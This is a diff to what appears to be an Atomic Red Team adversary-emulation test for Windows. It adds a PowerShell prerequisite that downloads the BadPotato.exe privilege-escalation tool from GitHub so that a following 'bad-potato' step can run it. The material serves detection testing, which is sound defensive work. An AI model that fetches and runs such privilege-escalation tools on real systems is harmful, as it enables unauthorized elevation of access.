@@ -16,6 +16,13 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        BadPotato.exe must exist in the temp directory
+      inline: |
+        if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\BadPotato.exe") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\BadPotato.exe" "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true"
+        }}
+      executor: powershell
     - name: bad-potato
       inline: |
         cd "PathToAtomicsFolder\..\ExternalPayloads"
